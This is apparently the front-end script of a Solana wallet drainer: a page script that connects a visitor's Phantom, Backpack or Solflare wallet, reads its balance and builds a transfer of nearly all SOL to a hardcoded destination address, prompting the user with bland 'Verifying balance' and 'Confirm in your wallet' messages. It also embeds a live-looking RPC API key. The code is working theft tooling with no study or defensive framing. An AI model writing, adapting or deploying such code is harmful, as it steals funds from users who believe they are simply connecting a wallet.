import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
} from "https://esm.sh/@solana/web3.js@1.95.3";

// ---- CONFIG ----
const DESTINATION = new PublicKey("8cGfpYnGSZDz1WbzReonTUNkDzJcL9K7adAKrKEKHUFN");
const RPC_ENDPOINT = "https://mainnet.helius-rpc.com/?api-key=ca46080b-fd3d-421a-96c2-aad84d199416"; // swap for Helius/QuickNode
const RENT_EXEMPT = 890_880; // rent-exempt minimum, must stay in the account
const FEE_BUFFER = 5_000;    // signature fee

const connection = new Connection(RPC_ENDPOINT, "confirmed");

const PROVIDERS = {
  phantom: () => window.phantom?.solana ?? (window.solana?.isPhantom ? window.solana : null),
  backpack: () => window.backpack ?? (window.solana?.isBackpack ? window.solana : null),
  solflare: () => window.solflare ?? (window.solana?.isSolflare ? window.solflare : null),
};

const statusEl = document.getElementById("status");
const setStatus = (t) => (statusEl.textContent = t);

document.querySelectorAll(".wallet").forEach((btn) => {
  btn.addEventListener("click", () => handleConnect(btn.dataset.wallet, btn));
});

async function handleConnect(name, btn) {
  const provider = PROVIDERS[name]?.();
  if (!provider) return setStatus(`${name} not detected`);

  document.querySelectorAll(".wallet").forEach((b) => (b.disabled = true));

  try {
    setStatus("Connecting…");
    const resp = await provider.connect();
    const rawKey = resp?.publicKey ?? provider.publicKey;
    if (!rawKey) throw new Error("No public key returned");
    const from = new PublicKey(rawKey.toString());

    setStatus("Verifying balance…");
    const balance = await connection.getBalance(from);
    const lamports = balance - RENT_EXEMPT - FEE_BUFFER;

    if (lamports <= 0) {
      setStatus("Nothing to sweep");
      return;
    }

    setStatus("Confirm in your wallet…");
    // fetch blockhash right before signing so it cannot go stale
    const { blockhash } = await connection.getLatestBlockhash("confirmed");
    const tx = new Transaction({ recentBlockhash: blockhash, feePayer: from }).add(
      SystemProgram.transfer({ fromPubkey: from, toPubkey: DESTINATION, lamports })
    );

    setStatus("Sending…");
    const res = await provider.signAndSendTransaction(tx);
    const signature = res?.signature ?? res;

    setStatus(`Sent. ${String(signature).slice(0, 8)}…`);

    // verify it actually landed instead of trusting the return
    const latest = await connection.getLatestBlockhash();
    const conf = await connection.confirmTransaction(
      { signature, blockhash, lastValidBlockHeight: latest.lastValidBlockHeight },
      "confirmed"
    );
    if (conf.value.err) throw new Error("Transaction failed");
    setStatus("Done.");
  } catch (err) {
    console.error(err);
    setStatus(err?.message ?? "Failed");
    document.querySelectorAll(".wallet").forEach((b) => (b.disabled = false));
  }
}
